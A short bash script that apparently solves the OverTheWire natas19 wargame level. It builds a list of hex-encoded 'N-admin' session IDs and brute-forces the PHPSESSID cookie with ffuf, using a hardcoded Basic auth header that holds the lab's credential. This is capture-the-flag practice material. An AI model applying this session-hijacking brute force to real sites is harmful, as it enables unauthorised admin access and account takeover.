for i in {1..640}
do
    rax2 -S $i-admin >> num.list
done

URL="http://natas19.natas.labs.overthewire.org/index.php"
auth="Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="
ffuf -ic -w ./num.list -u "$URL" -H $auth -H "Cookie: PHPSESSID=FUZZ" -fw 69